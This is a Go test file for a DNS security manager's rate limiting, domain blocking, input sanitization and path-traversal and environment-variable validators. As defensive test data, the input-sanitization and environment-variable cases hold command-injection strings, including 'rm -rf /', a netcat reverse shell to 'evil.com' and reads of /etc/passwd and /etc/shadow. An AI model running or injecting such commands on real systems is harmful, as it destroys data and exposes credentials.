package hecate

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/eos_io"
	"github.com/stretchr/testify/assert"
)

func TestDNSSecurity(t *testing.T) {
	rc := &eos_io.RuntimeContext{
		Ctx: context.Background(),
	}

	client := &HecateClient{rc: rc}
	dnsSecurityManager := NewDNSSecurityManager(client)

	t.Run("RateLimiting", func(t *testing.T) {
		rateLimiter := NewDNSRateLimiter(2, time.Minute) // 2 requests per minute

		clientID := "test-client"

		// First two requests should succeed
		assert.True(t, rateLimiter.CheckRateLimit(clientID), "First request should be allowed")
		assert.True(t, rateLimiter.CheckRateLimit(clientID), "Second request should be allowed")

		// Third request should fail
		assert.False(t, rateLimiter.CheckRateLimit(clientID), "Third request should be blocked")

		// Different client should be allowed
		assert.True(t, rateLimiter.CheckRateLimit("other-client"), "Different client should be allowed")
	})

	t.Run("SecurityEventMonitoring", func(t *testing.T) {
		monitor := NewDNSSecurityMonitor()

		event := DNSSecurityEvent{
			EventType:   "test_event",
			Domain:      "test.example.com",
			ClientID:    "test-client",
			Severity:    "high",
			Description: "Test security event",
		}

		monitor.RecordSecurityEvent(event)

		events := monitor.GetSecurityEvents()
		assert.Len(t, events, 1, "Should have one recorded event")
		assert.Equal(t, "test_event", events[0].EventType)
		assert.Equal(t, "high", events[0].Severity)
	})

	t.Run("DomainValidation", func(t *testing.T) {
		// Test valid domains
		validDomains := []string{
			"example.com",
			"sub.example.org",
			"test-domain.net",
		}

		for _, domain := range validDomains {
			err := dnsSecurityManager.validateSecureDNSRequest(domain, "1.2.3.4", "test-client")
			assert.NoError(t, err, "Valid domain should pass security validation: %s", domain)
		}
	})

	t.Run("SuspiciousPatternDetection", func(t *testing.T) {
		// Test suspicious domain patterns
		suspiciousDomains := []string{
			"phishing.example.com",
			"malware-site.com",
			"evil.test.com",
		}

		for _, domain := range suspiciousDomains {
			err := dnsSecurityManager.validateSecureDNSRequest(domain, "1.2.3.4", "test-client")
			assert.Error(t, err, "Suspicious domain should fail validation: %s", domain)
			assert.Contains(t, err.Error(), "suspicious pattern")
		}

		// Test suspicious IP patterns
		suspiciousIPs := []string{
			"127.0.0.1",
			"255.255.255.255",
		}

		for _, ip := range suspiciousIPs {
			err := dnsSecurityManager.validateSecureDNSRequest("test.example.com", ip, "test-client")
			assert.Error(t, err, "Suspicious IP should fail validation: %s", ip)
			// The error could be from either suspicious range or basic IP validation
			assert.True(t, 
				strings.Contains(err.Error(), "suspicious range") || 
				strings.Contains(err.Error(), "not allowed"),
				"Error should mention suspicious range or not allowed: %s", err.Error())
		}
	})

	t.Run("BlockedDomainDetection", func(t *testing.T) {
		// Test blocked domains
		blockedDomains := []string{
			"malicious.example.com",
			"phishing.test.com",
		}

		for _, domain := range blockedDomains {
			err := dnsSecurityManager.validateSecureDNSRequest(domain, "1.2.3.4", "test-client")
			assert.Error(t, err, "Blocked domain should fail validation: %s", domain)
			// The error could be from either suspicious pattern or blocked domain check
			assert.True(t, 
				strings.Contains(err.Error(), "blocked by security policy") || 
				strings.Contains(err.Error(), "suspicious pattern"),
				"Error should mention either blocked policy or suspicious pattern: %s", err.Error())
		}
	})

	t.Run("ProtectedDomainDeletion", func(t *testing.T) {
		// Test protected domain deletion
		protectedDomains := []string{
			"localhost",
			"example.com",
			"test.com",
		}

		for _, domain := range protectedDomains {
			err := dnsSecurityManager.validateSecureDNSDeletion(domain, "test-client")
			assert.Error(t, err, "Protected domain deletion should fail: %s", domain)
			assert.Contains(t, err.Error(), "protected domain")
		}

		// Test non-protected domain deletion
		err := dnsSecurityManager.validateSecureDNSDeletion("normal.example.org", "test-client")
		assert.NoError(t, err, "Non-protected domain deletion should succeed")
	})

	t.Run("SecurityStatus", func(t *testing.T) {
		// Create a fresh security manager to avoid counting events from previous tests
		freshClient := &HecateClient{rc: rc}
		freshSecurityManager := NewDNSSecurityManager(freshClient)
		
		// Record some events on the fresh manager
		monitor := freshSecurityManager.monitor
		
		monitor.RecordSecurityEvent(DNSSecurityEvent{
			EventType: "test_event_1",
			Severity:  "high",
		})
		
		monitor.RecordSecurityEvent(DNSSecurityEvent{
			EventType: "test_event_2", 
			Severity:  "info",
		})

		status := freshSecurityManager.GetSecurityStatus()
		assert.Equal(t, 2, status.TotalEvents, "Should have 2 total events")
		assert.Equal(t, 1, status.HighSeverityEvents, "Should have 1 high severity event")
		assert.False(t, status.LastEventTime.IsZero(), "Should have last event time set")
	})

	t.Run("InputSanitization", func(t *testing.T) {
		// Test input sanitization
		maliciousInputs := []string{
			"domain; rm -rf /",
			"domain.com && curl evil.com",
			"domain.com | nc evil.com 4444",
			"domain.com $(cat /etc/passwd)",
		}

		for _, input := range maliciousInputs {
			sanitized := SanitizeInput(input)
			
			// Should not contain dangerous characters
			assert.NotContains(t, sanitized, ";", "Should not contain semicolon")
			assert.NotContains(t, sanitized, "&", "Should not contain ampersand")
			assert.NotContains(t, sanitized, "|", "Should not contain pipe")
			assert.NotContains(t, sanitized, "$", "Should not contain dollar")
			assert.NotContains(t, sanitized, "(", "Should not contain opening paren")
			assert.NotContains(t, sanitized, ")", "Should not contain closing paren")
		}
	})

	t.Run("PathTraversalValidation", func(t *testing.T) {
		// Test path traversal validation
		maliciousPaths := []string{
			"../../../etc/passwd",
			"..\\..\\windows\\system32",
			"/etc/shadow",
			"config/../../../etc/hosts",
		}

		for _, path := range maliciousPaths {
			err := ValidatePathTraversal(path)
			assert.Error(t, err, "Malicious path should fail validation: %s", path)
			assert.Contains(t, err.Error(), "dangerous pattern")
		}

		// Test valid paths
		validPaths := []string{
			"config.json",
			"data/config.yaml",
			"templates/index.html",
		}

		for _, path := range validPaths {
			err := ValidatePathTraversal(path)
			assert.NoError(t, err, "Valid path should pass validation: %s", path)
		}
	})

	t.Run("EnvironmentVariableValidation", func(t *testing.T) {
		// Test environment variable validation
		maliciousEnvVars := map[string]string{
			"DOMAIN":        "example.com; export ADMIN=true",
			"BACKEND_IP":    "127.0.0.1 && nc -e /bin/sh evil.com 4444",
			"SSL_CERT_PATH": "/etc/ssl/certs/../../etc/shadow",
		}

		for name, value := range maliciousEnvVars {
			err := ValidateEnvironmentVariable(name, value)
			assert.Error(t, err, "Malicious env var should fail validation: %s=%s", name, value)
		}

		// Test valid environment variables
		validEnvVars := map[string]string{
			"DOMAIN":     "example.com",
			"BACKEND_IP": "192.168.1.100",
			"PORT":       "8080",
		}

		for name, value := range validEnvVars {
			err := ValidateEnvironmentVariable(name, value)
			assert.NoError(t, err, "Valid env var should pass validation: %s=%s", name, value)
		}
	})
}